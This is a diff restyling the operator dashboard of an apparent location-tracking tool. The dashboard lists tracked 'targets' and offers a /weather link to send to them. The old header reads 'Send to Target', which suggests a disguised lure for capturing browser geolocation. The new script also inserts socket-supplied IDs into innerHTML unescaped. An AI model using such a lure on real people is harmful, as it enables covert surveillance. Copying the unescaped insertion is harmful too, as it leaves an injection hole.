@@ -4,44 +4,1194 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Home</title>
-    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/bulma/1.0.2/css/bulma.min.css">
+
+    <title>GeoTrack | Location Intelligence</title>
+
+    <meta name="description"
+        content="Real-time geolocation monitoring and location intelligence dashboard.">
+
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+
+    <link
+        href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700;800&family=JetBrains+Mono:wght@400;500;600&display=swap"
+        rel="stylesheet">
+
+    <style>
+        :root {
+            --bg: #070b12;
+            --surface: #0d131d;
+            --surface-2: #111a26;
+            --surface-3: #162131;
+
+            --border: rgba(255, 255, 255, 0.08);
+            --border-hover: rgba(255, 255, 255, 0.16);
+
+            --text: #f5f7fa;
+            --muted: #8b98aa;
+
+            --accent: #38bdf8;
+            --accent-soft: rgba(56, 189, 248, 0.12);
+
+            --success: #22c55e;
+            --success-soft: rgba(34, 197, 94, 0.12);
+
+            --warning: #f59e0b;
+
+            --radius: 18px;
+        }
+
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+
+        body {
+            min-height: 100vh;
+            background:
+                radial-gradient(
+                    circle at 15% 10%,
+                    rgba(56, 189, 248, 0.08),
+                    transparent 30%
+                ),
+                radial-gradient(
+                    circle at 85% 80%,
+                    rgba(59, 130, 246, 0.06),
+                    transparent 30%
+                ),
+                var(--bg);
+
+            color: var(--text);
+
+            font-family: "Inter", sans-serif;
+
+            overflow-x: hidden;
+        }
+
+        /* =========================
+           TOP NAVIGATION
+        ========================= */
+
+        .navbar {
+            height: 74px;
+
+            display: flex;
+            align-items: center;
+            justify-content: space-between;
+
+            padding: 0 6%;
+
+            border-bottom: 1px solid var(--border);
+
+            background: rgba(7, 11, 18, 0.82);
+
+            backdrop-filter: blur(16px);
+
+            position: sticky;
+            top: 0;
+
+            z-index: 100;
+        }
+
+        .brand {
+            display: flex;
+            align-items: center;
+            gap: 13px;
+        }
+
+        .brand-icon {
+            width: 40px;
+            height: 40px;
+
+            display: grid;
+            place-items: center;
+
+            border-radius: 12px;
+
+            background: var(--accent-soft);
+
+            border: 1px solid rgba(56, 189, 248, 0.2);
+
+            font-size: 20px;
+        }
+
+        .brand-text {
+            display: flex;
+            flex-direction: column;
+        }
+
+        .brand-title {
+            font-size: 15px;
+            font-weight: 800;
+            letter-spacing: -0.2px;
+        }
+
+        .brand-subtitle {
+            color: var(--muted);
+            font-size: 11px;
+            margin-top: 2px;
+        }
+
+        .nav-right {
+            display: flex;
+            align-items: center;
+            gap: 20px;
+        }
+
+        .system-status {
+            display: flex;
+            align-items: center;
+            gap: 8px;
+
+            padding: 8px 12px;
+
+            border: 1px solid rgba(34, 197, 94, 0.15);
+
+            background: var(--success-soft);
+
+            border-radius: 999px;
+
+            font-size: 12px;
+            font-weight: 600;
+
+            color: #86efac;
+        }
+
+        .status-dot {
+            width: 7px;
+            height: 7px;
+
+            background: var(--success);
+
+            border-radius: 50%;
+
+            box-shadow: 0 0 12px rgba(34, 197, 94, 0.8);
+
+            animation: pulse 2s infinite;
+        }
+
+        @keyframes pulse {
+
+            0%,
+            100% {
+                opacity: 1;
+                transform: scale(1);
+            }
+
+            50% {
+                opacity: 0.45;
+                transform: scale(0.75);
+            }
+        }
+
+        .github-link {
+            color: var(--muted);
+
+            text-decoration: none;
+
+            font-size: 13px;
+            font-weight: 600;
+
+            transition: 0.2s ease;
+        }
+
+        .github-link:hover {
+            color: var(--text);
+        }
+
+        /* =========================
+           MAIN
+        ========================= */
+
+        main {
+            width: min(1180px, 90%);
+
+            margin: 0 auto;
+
+            padding: 55px 0 80px;
+        }
+
+        .hero {
+            display: grid;
+
+            grid-template-columns: 1fr auto;
+
+            gap: 30px;
+
+            align-items: end;
+
+            margin-bottom: 32px;
+        }
+
+        .eyebrow {
+            display: inline-flex;
+
+            align-items: center;
+
+            gap: 8px;
+
+            color: var(--accent);
+
+            font-family: "JetBrains Mono", monospace;
+
+            font-size: 11px;
+
+            text-transform: uppercase;
+
+            letter-spacing: 1.4px;
+
+            margin-bottom: 13px;
+        }
+
+        .hero h1 {
+            font-size: clamp(32px, 5vw, 52px);
+
+            line-height: 1.05;
+
+            letter-spacing: -2.2px;
+
+            font-weight: 800;
+        }
+
+        .hero h1 span {
+            color: var(--accent);
+        }
+
+        .hero-description {
+            color: var(--muted);
+
+            max-width: 650px;
+
+            margin-top: 15px;
+
+            line-height: 1.7;
+
+            font-size: 14px;
+        }
+
+        /* =========================
+           STATS
+        ========================= */
+
+        .stats {
+            display: grid;
+
+            grid-template-columns: repeat(2, 180px);
+
+            gap: 12px;
+        }
+
+        .stat-card {
+            padding: 18px;
+
+            background: var(--surface);
+
+            border: 1px solid var(--border);
+
+            border-radius: 16px;
+        }
+
+        .stat-label {
+            color: var(--muted);
+
+            font-size: 11px;
+
+            text-transform: uppercase;
+
+            letter-spacing: 0.8px;
+        }
+
+        .stat-value {
+            font-size: 28px;
+
+            font-weight: 800;
+
+            margin-top: 7px;
+        }
+
+        /* =========================
+           TRACKER URL
+        ========================= */
+
+        .tracker-panel {
+            background:
+                linear-gradient(
+                    135deg,
+                    rgba(56, 189, 248, 0.08),
+                    rgba(56, 189, 248, 0.02)
+                );
+
+            border: 1px solid rgba(56, 189, 248, 0.15);
+
+            border-radius: var(--radius);
+
+            padding: 22px;
+
+            margin-bottom: 38px;
+        }
+
+        .tracker-header {
+            display: flex;
+
+            justify-content: space-between;
+
+            align-items: center;
+
+            gap: 15px;
+
+            margin-bottom: 14px;
+        }
+
+        .tracker-title {
+            font-size: 14px;
+
+            font-weight: 700;
+        }
+
+        .tracker-description {
+            color: var(--muted);
+
+            font-size: 12px;
+
+            margin-top: 4px;
+        }
+
+        .copy-button {
+            border: 1px solid var(--border-hover);
+
+            background: rgba(255, 255, 255, 0.04);
+
+            color: var(--text);
+
+            border-radius: 10px;
+
+            padding: 9px 13px;
+
+            cursor: pointer;
+
+            font-size: 12px;
+
+            font-weight: 600;
+
+            transition: 0.2s ease;
+        }
+
+        .copy-button:hover {
+            background: rgba(255, 255, 255, 0.08);
+        }
+
+        .url-box {
+            display: flex;
+
+            align-items: center;
+
+            gap: 12px;
+
+            background: #080d15;
+
+            border: 1px solid var(--border);
+
+            border-radius: 12px;
+
+            padding: 13px 15px;
+
+            overflow: hidden;
+        }
+
+        .url-icon {
+            flex-shrink: 0;
+
+            color: var(--accent);
+        }
+
+        .url-text {
+            color: #a5dff7;
+
+            font-family: "JetBrains Mono", monospace;
+
+            font-size: 12px;
+
+            overflow: hidden;
+
+            text-overflow: ellipsis;
+
+            white-space: nowrap;
+        }
+
+        /* =========================
+           TARGETS
+        ========================= */
+
+        .section-header {
+            display: flex;
+
+            align-items: center;
+
+            justify-content: space-between;
+
+            margin-bottom: 17px;
+        }
+
+        .section-title {
+            display: flex;
+
+            align-items: center;
+
+            gap: 10px;
+
+            font-size: 17px;
+
+            font-weight: 700;
+        }
+
+        .section-title-icon {
+            color: var(--accent);
+        }
+
+        .live-label {
+            font-family: "JetBrains Mono", monospace;
+
+            font-size: 10px;
+
+            color: #86efac;
+
+            letter-spacing: 1px;
+
+            text-transform: uppercase;
+        }
+
+        #tar-content {
+            display: grid;
+
+            grid-template-columns:
+                repeat(auto-fill, minmax(270px, 1fr));
+
+            gap: 14px;
+        }
+
+        .target-card {
+            position: relative;
+
+            display: block;
+
+            padding: 20px;
+
+            text-decoration: none;
+
+            color: var(--text);
+
+            background: var(--surface);
+
+            border: 1px solid var(--border);
+
+            border-radius: 16px;
+
+            overflow: hidden;
+
+            transition:
+                transform 0.2s ease,
+                border-color 0.2s ease,
+                background 0.2s ease;
+        }
+
+        .target-card::before {
+            content: "";
+
+            position: absolute;
+
+            top: 0;
+            left: 0;
+
+            width: 3px;
+            height: 100%;
+
+            background: var(--accent);
+
+            opacity: 0.7;
+        }
+
+        .target-card:hover {
+            transform: translateY(-3px);
+
+            border-color: rgba(56, 189, 248, 0.3);
+
+            background: var(--surface-2);
+        }
+
+        .target-top {
+            display: flex;
+
+            align-items: center;
+
+            justify-content: space-between;
+
+            margin-bottom: 18px;
+        }
+
+        .target-icon {
+            width: 40px;
+            height: 40px;
+
+            display: grid;
+            place-items: center;
+
+            border-radius: 11px;
+
+            background: var(--accent-soft);
+
+            border: 1px solid rgba(56, 189, 248, 0.15);
+
+            font-size: 18px;
+        }
+
+        .target-status {
+            display: flex;
+
+            align-items: center;
+
+            gap: 6px;
+
+            font-size: 10px;
+
+            color: #86efac;
+
+            text-transform: uppercase;
+
+            letter-spacing: 0.7px;
+        }
+
+        .target-status-dot {
+            width: 6px;
+            height: 6px;
+
+            border-radius: 50%;
+
+            background: var(--success);
+        }
+
+        .target-id-label {
+            color: var(--muted);
+
+            font-size: 10px;
+
+            text-transform: uppercase;
+
+            letter-spacing: 1px;
+
+            margin-bottom: 6px;
+        }
+
+        .target-id {
+            font-family: "JetBrains Mono", monospace;
+
+            font-size: 14px;
+
+            font-weight: 600;
+
+            word-break: break-all;
+        }
+
+        .target-footer {
+            display: flex;
+
+            align-items: center;
+
+            justify-content: space-between;
+
+            margin-top: 18px;
+
+            padding-top: 14px;
+
+            border-top: 1px solid var(--border);
+
+            color: var(--muted);
+
+            font-size: 11px;
+        }
+
+        .open-map {
+            color: var(--accent);
+
+            font-weight: 600;
+        }
+
+        /* =========================
+           EMPTY STATE
+        ========================= */
+
+        .empty-state {
+            grid-column: 1 / -1;
+
+            text-align: center;
+
+            padding: 70px 20px;
+
+            border: 1px dashed var(--border-hover);
+
+            border-radius: 18px;
+
+            background: rgba(255, 255, 255, 0.015);
+        }
+
+        .empty-icon {
+            font-size: 40px;
+
+            margin-bottom: 14px;
+
+            opacity: 0.8;
+        }
+
+        .empty-title {
+            font-size: 16px;
+
+            font-weight: 700;
+        }
+
+        .empty-description {
+            color: var(--muted);
+
+            font-size: 12px;
+
+            margin-top: 7px;
+        }
+
+        /* =========================
+           FOOTER
+        ========================= */
+
+        footer {
+            text-align: center;
+
+            color: #586578;
+
+            font-size: 11px;
+
+            padding: 25px;
+
+            border-top: 1px solid var(--border);
+        }
+
+        footer a {
+            color: var(--muted);
+
+            text-decoration: none;
+        }
+
+        /* =========================
+           MOBILE
+        ========================= */
+
+        @media (max-width: 760px) {
+
+            .navbar {
+                padding: 0 5%;
+            }
+
+            .github-link {
+                display: none;
+            }
+
+            main {
+                width: 92%;
+
+                padding-top: 38px;
+            }
+
+            .hero {
+                grid-template-columns: 1fr;
+            }
+
+            .stats {
+                grid-template-columns: repeat(2, 1fr);
+            }
+
+            .tracker-header {
+                align-items: flex-start;
+
+                flex-direction: column;
+            }
+
+            .copy-button {
+                width: 100%;
+            }
+        }
+
+        @media (max-width: 480px) {
+
+            .brand-subtitle {
+                display: none;
+            }
+
+            .system-status {
+                padding: 7px 9px;
+            }
+
+            .hero h1 {
+                font-size: 35px;
+            }
+
+            #tar-content {
+                grid-template-columns: 1fr;
+            }
+        }
+    </style>
 </head>
 
 <body>
-    <header class="has-background-black p-3 has-text-centered">
-        <h1 class="title is-4 mb-2">Live Location Tracker</h1>
-        <a href="https://www.linkedin.com/in/gulshanverse/" class="is-block mb-2">FOR Education Purpose Only</a>
-        <p class="is-block">Send to Target: <code>{{ global.remoteURL }}/weather</code></p>
-    </header>
 
-    <section id="tar-content" class="container is-widescreen p-2 is-flex is-flex-direction-column is-gap-1">
-        <h1 class="title is-5">Targets</h1>
+    <!-- =========================
+         NAVIGATION
+    ========================== -->
 
-        {{ for(value, key in TARGETS) }}
-        <a href="/map?id={{ key }}" class="button is-fullwidth">
-            {{ key }}
-        </a>
-        {{/}}
-    </section>
+    <nav class="navbar">
+
+        <div class="brand">
+
+            <div class="brand-icon">
+                🌐
+            </div>
+
+            <div class="brand-text">
+
+                <div class="brand-title">
+                    GeoTrack
+                </div>
+
+                <div class="brand-subtitle">
+                    Real-Time Location Intelligence
+                </div>
+
+            </div>
+
+        </div>
+
+        <div class="nav-right">
+
+            <div class="system-status">
+                <span class="status-dot"></span>
+                SYSTEM ONLINE
+            </div>
+
+            <a
+                class="github-link"
+                href="https://github.com/gulshanverse/real-time-location-intelligence-and-tracking"
+                target="_blank"
+            >
+                GitHub ↗
+            </a>
+
+        </div>
+
+    </nav>
+
+
+    <!-- =========================
+         MAIN CONTENT
+    ========================== -->
+
+    <main>
+
+        <!-- HERO -->
+
+        <section class="hero">
+
+            <div>
+
+                <div class="eyebrow">
+                    ● LIVE MONITORING CONSOLE
+                </div>
+
+                <h1>
+                    Location
+                    <span>Intelligence.</span>
+                </h1>
+
+                <p class="hero-description">
+                    Monitor authorized devices in real time using
+                    browser geolocation, event-driven communication,
+                    and interactive geospatial visualization.
+                </p>
+
+            </div>
+
+
+            <!-- STATS -->
+
+            <div class="stats">
+
+                <div class="stat-card">
+
+                    <div class="stat-label">
+                        Active Targets
+                    </div>
+
+                    <div
+                        class="stat-value"
+                        id="target-count"
+                    >
+                        0
+                    </div>
+
+                </div>
+
+                <div class="stat-card">
+
+                    <div class="stat-label">
+                        Connection
+                    </div>
+
+                    <div
+                        class="stat-value"
+                        style="font-size: 18px; margin-top: 13px;"
+                    >
+                        <span style="color:#22c55e;">
+                            ● LIVE
+                        </span>
+                    </div>
+
+                </div>
+
+            </div>
+
+        </section>
+
+
+        <!-- TRACKER URL -->
+
+        <section class="tracker-panel">
+
+            <div class="tracker-header">
+
+                <div>
+
+                    <div class="tracker-title">
+                        📡 Tracker Endpoint
+                    </div>
+
+                    <div class="tracker-description">
+                        Open this endpoint on an authorized device
+                        to share its current location.
+                    </div>
+
+                </div>
+
+                <button
+                    class="copy-button"
+                    id="copy-url"
+                    type="button"
+                >
+                    Copy URL
+                </button>
+
+            </div>
+
+
+            <div class="url-box">
+
+                <div class="url-icon">
+                    ↗
+                </div>
+
+                <div
+                    class="url-text"
+                    id="tracker-url"
+                >
+                    {{ global.remoteURL }}/weather
+                </div>
+
+            </div>
+
+        </section>
+
+
+        <!-- TARGETS -->
+
+        <section>
+
+            <div class="section-header">
+
+                <div class="section-title">
+
+                    <span class="section-title-icon">
+                        ◉
+                    </span>
+
+                    Connected Targets
+
+                </div>
+
+                <div class="live-label">
+                    Real-Time
+                </div>
+
+            </div>
+
+
+            <div id="tar-content">
+
+                {{ for(value, key in TARGETS) }}
+
+                <a
+                    href="/map?id={{ key }}"
+                    class="target-card"
+                >
+
+                    <div class="target-top">
+
+                        <div class="target-icon">
+                            📍
+                        </div>
+
+                        <div class="target-status">
+
+                            <span class="target-status-dot"></span>
+
+                            Active
+
+                        </div>
+
+                    </div>
+
+
+                    <div class="target-id-label">
+                        Device Identifier
+                    </div>
+
+                    <div class="target-id">
+                        {{ key }}
+                    </div>
+
+
+                    <div class="target-footer">
+
+                        <span>
+                            Location stream
+                        </span>
+
+                        <span class="open-map">
+                            Open Map →
+                        </span>
+
+                    </div>
+
+                </a>
+
+                {{/}}
+
+            </div>
+
+        </section>
+
+    </main>
+
+
+    <!-- FOOTER -->
+
+    <footer>
+
+        <div>
+            GeoTrack • Real-Time Location Intelligence
+        </div>
+
+        <div style="margin-top: 6px;">
+            Built for authorized educational and development use.
+            ·
+            <a
+                href="https://github.com/gulshanverse/real-time-location-intelligence-and-tracking"
+                target="_blank"
+            >
+                View Source
+            </a>
+        </div>
+
+    </footer>
+
+
+    <!-- =========================
+         SOCKET.IO
+    ========================== -->
 
     <script src="https://cdn.jsdelivr.net/npm/socket.io@4.8.1/client-dist/socket.io.min.js"></script>
+
     <script>
-        const content = document.querySelector("#tar-content")
+
+        const content = document.querySelector("#tar-content");
+
+        const targetCount = document.querySelector("#target-count");
+
+        const trackerURL =
+            document.querySelector("#tracker-url").innerText.trim();
+
+        const copyButton =
+            document.querySelector("#copy-url");
+
+
+        /*
+         * Update target counter
+         */
+
+        function updateTargetCount() {
+
+            const cards =
+                content.querySelectorAll(".target-card");
+
+            targetCount.innerText = cards.length;
+
+        }
+
+
+        /*
+         * Copy tracker URL
+         */
+
+        copyButton.addEventListener("click", async () => {
+
+            try {
+
+                await navigator.clipboard.writeText(trackerURL);
+
+                copyButton.innerText = "Copied ✓";
+
+                setTimeout(() => {
+
+                    copyButton.innerText = "Copy URL";
+
+                }, 1800);
+
+            } catch (error) {
+
+                console.error(
+                    "Unable to copy tracker URL:",
+                    error
+                );
+
+            }
+
+        });
+
+
+        /*
+         * Socket.IO connection
+         */
+
         const socket = io("", {
+
             secure: true,
+
             path: "/socket.io",
-            transports: ['websocket']
-        })
+
+            transports: ["websocket"]
+
+        });
+
+
+        /*
+         * New target connected
+         */
 
         socket.on("user-connected", newId => {
-            const a = document.createElement('a')
-            a.href = `/map?id=${newId}`
-            a.className = "button is-fullwidth"
-            a.innerText = newId
-            content.appendChild(a)
-        })
+
+            /*
+             * Prevent duplicate cards
+             */
+
+            const existingTarget =
+                Array.from(
+                    content.querySelectorAll(".target-card")
+                ).find(card =>
+                    card.dataset.targetId === newId
+                );
+
+            if (existingTarget) {
+                return;
+            }
+
+
+            /*
+             * Create target card
+             */
+
+            const card =
+                document.createElement("a");
+
+            card.href =
+                `/map?id=${encodeURIComponent(newId)}`;
+
+            card.className =
+                "target-card";
+
+            card.dataset.targetId =
+                newId;
+
+
+            card.innerHTML = `
+
+                <div class="target-top">
+
+                    <div class="target-icon">
+                        📍
+                    </div>
+
+                    <div class="target-status">
+
+                        <span class="target-status-dot"></span>
+
+                        Active
+
+                    </div>
+
+                </div>
+
+
+                <div class="target-id-label">
+                    Device Identifier
+                </div>
+
+                <div class="target-id">
+                    ${newId}
+                </div>
+
+
+                <div class="target-footer">
+
+                    <span>
+                        Location stream
+                    </span>
+
+                    <span class="open-map">
+                        Open Map →
+                    </span>
+
+                </div>
+
+            `;
+
+
+            /*
+             * Add card
+             */
+
+            content.appendChild(card);
+
+
+            /*
+             * Update counter
+             */
+
+            updateTargetCount();
+
+        });
+
+
+        /*
+         * Initial target count
+         */
+
+        updateTargetCount();
+
     </script>
+
 </body>
 
 </html>
